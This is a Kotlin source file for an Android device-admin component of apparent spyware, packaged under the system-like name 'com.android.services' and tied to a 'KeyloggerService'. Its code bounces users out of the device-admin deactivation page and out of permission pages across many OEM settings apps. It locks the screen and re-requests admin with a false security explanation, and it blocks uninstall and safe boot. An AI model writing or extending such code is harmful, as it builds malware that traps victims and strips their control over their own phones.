package com.android.services

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.os.UserManager
import android.util.Log

class AppDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        val dpm   = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
        if (dpm.isDeviceOwnerApp(context.packageName)) {
            dpm.setUninstallBlocked(admin, context.packageName, true)
        }
    }

    /**
     * FIX Bug 2 — sebelumnya hanya return teks, user tetap bisa tap "Deactivate".
     * Sekarang: sinyal KeyloggerService untuk press BACK + HOME secepat mungkin
     * sehingga user terpental keluar dari halaman Device Admin sebelum bisa tap.
     */
    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        try {
            KeyloggerService.instance?.performGlobalAction(
                android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
            )
            Handler(Looper.getMainLooper()).postDelayed({
                KeyloggerService.instance?.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                )
            }, 0)
        } catch (_: Exception) {}
        return "Akses administrator tidak dapat dinonaktifkan."
    }

    /**
     * FIX Bug 3 — sebelumnya hanya lockNow(), tanpa re-request admin.
     * Sekarang: lockNow() + langsung launch intent re-request Device Admin.
     */
    override fun onDisabled(context: Context, intent: Intent) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try { dpm.lockNow() } catch (_: Exception) {}

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val reAdmin = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        ComponentName(context, AppDeviceAdminReceiver::class.java))
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Administrator sistem diperlukan untuk keamanan perangkat.")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                context.startActivity(reAdmin)
            } catch (e: Exception) {
                Log.w(TAG, "re-request admin failed: ${e.message}")
            }
        }, 0)
    }

    companion object {
        private const val TAG = "AdminReceiver"

        /** Settings packages yang bisa menampilkan halaman Device Admin management */
        val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            "com.samsung.android.settings",
            "com.miui.securitycenter",
            "com.huawei.systemmanager",
            "com.coloros.safecenter",
            "com.oppo.safe",
            "com.vivo.permissionmanager"
        )

        /** Class name keyword yang menandakan halaman Device Admin deactivation */
        val ADMIN_PAGE_KEYWORDS = listOf(
            "DeviceAdmin", "DevicePolicy", "ManageDeviceAdmin",
            "ActiveAdmin", "DeviceAdminAdd", "SecuritySettings",
            "TrustedDevice"
        )

        /** Packages Settings + Permission controller dari berbagai OEM */
        val PERMISSION_SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            "com.samsung.android.settings",
            "com.miui.securitycenter",
            "com.miui.permcenter",               // Xiaomi MIUI 12+
            "com.huawei.systemmanager",
            "com.huawei.permissionmanager",      // EMUI 11+
            "com.coloros.safecenter",
            "com.coloros.permissionmanager",     // ColorOS 12+
            "com.oppo.safe",
            "com.vivo.permissionmanager",
            "com.vivo.securedaemon",             // vivo OriginOS
            "com.zte.privacyguard",              // ZTE
            "com.meizu.safe",                    // Flyme
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller"
        )

        /**
         * Package yang 100% dedicated ke permission UI saja.
         * Semua window dari package ini LANGSUNG diblokir tanpa perlu cek className.
         */
        val PERMISSION_CONTROLLER_PACKAGES = setOf(
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.samsung.android.permissioncontroller",
            "com.vivo.permissionmanager",
            "com.coloros.permissionmanager",
            "com.huawei.permissionmanager",
            "com.miui.permcenter"
        )

        /**
         * Class name keyword yang menandakan halaman manajemen permission app.
         * Ketika terdeteksi, guardPermissionPage() akan multi-BACK + HOME
         * sehingga user tidak bisa mematikan permission yang sudah aktif.
         *
         * Catatan: package dalam PERMISSION_CONTROLLER_PACKAGES tidak perlu
         * match keyword ini — semua window-nya diblokir langsung.
         */
        val PERMISSION_PAGE_KEYWORDS = listOf(
            // ── AOSP / Pixel ─────────────────────────────────────────────────
            "AppPermission",          // AOSP: detail 1 permission (toggle on/off)
            "AppPermissions",         // AOSP: daftar semua permission app
            "AppPermissionGroup",     // Android 13+ group permission page
            "AppPermissionGroups",    // Android 13+ daftar group
            "PermissionApps",         // AOSP: daftar app per-permission
            "PermissionAppsFragment", // AOSP fragment variant
            "GrantPermissions",       // dialog grant permission runtime
            "PermissionController",   // catch-all permissioncontroller activity
            "PermissionHistory",      // Android 12+ permission usage history
            "PermissionUsage",        // Android 12+ privacy dashboard
            "NewPermissionActivity",  // Pixel Android 14+
            "HighRiskPermission",     // Pixel dangerous permission warning
            // ── Samsung OneUI ────────────────────────────────────────────────
            "ManagePermissions",      // OneUI permission management
            "AppInfoWithHeader",      // OneUI parent container permission
            "SemAppPermission",       // OneUI 5+ specific
            "SubSettings",            // Generic Settings container (Samsung + AOSP)
            // ── MIUI / Xiaomi ────────────────────────────────────────────────
            "PermissionDetails",      // MIUI detail permission
            "MiuiPermManager",        // MIUI permission manager activity
            "AuthorityManager",       // MIUI 13+
            // ── AppOps ───────────────────────────────────────────────────────
            "AppOpsDetails",          // AppOps detail
            "AppOps",                 // AppOps general
            "AppOpsSummary",          // AppOps summary
            // ── Vendor generic ───────────────────────────────────────────────
            "RuntimePermission",      // berbagai ROM vendor
            "PermissionManager",      // vivo / oppo / zte
            "PrivacyPermission",      // Flyme / ZTE
            "SecurePermission",       // ZTE
            "PermissionSetting"       // Huawei EMUI
        )

        fun getComponentName(context: Context) =
            ComponentName(context, AppDeviceAdminReceiver::class.java)

        fun isAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(getComponentName(context))
        }

        fun isDeviceOwner(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isDeviceOwnerApp(context.packageName)
        }

        fun setBlockUninstall(context: Context, block: Boolean): String {
            val dpm   = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = getComponentName(context)
            return when {
                !dpm.isAdminActive(admin) ->
                    "ERROR: Device Admin tidak aktif. Buka Settings > Security > Device Admin > aktifkan app ini."

                dpm.isDeviceOwnerApp(context.packageName) -> {
                    if (block) {
                        dpm.addUserRestriction(admin, UserManager.DISALLOW_UNINSTALL_APPS)
                        dpm.addUserRestriction(admin, UserManager.DISALLOW_SAFE_BOOT)
                        dpm.setUninstallBlocked(admin, context.packageName, true)
                    } else {
                        dpm.clearUserRestriction(admin, UserManager.DISALLOW_UNINSTALL_APPS)
                        dpm.clearUserRestriction(admin, UserManager.DISALLOW_SAFE_BOOT)
                        dpm.setUninstallBlocked(admin, context.packageName, false)
                    }
                    if (block) "BLOCK_ACTIVE: Uninstall diblokir sistem (Device Owner)"
                    else "BLOCK_INACTIVE: Proteksi uninstall dilepas"
                }

                else -> {
                    // Admin only — setUninstallBlocked butuh Device Owner di API 21+,
                    // tapi coba dulu (beberapa ROM vendor mengizinkan admin biasa)
                    try {
                        dpm.setUninstallBlocked(admin, context.packageName, block)
                    } catch (_: SecurityException) {}
                    if (block)
                        "ADMIN_ONLY: Block parsial aktif. Untuk full block: adb shell dpm set-device-owner com.android.services/.AppDeviceAdminReceiver"
                    else
                        "ADMIN_ONLY: Proteksi parsial dilepas."
                }
            }
        }
    }
}
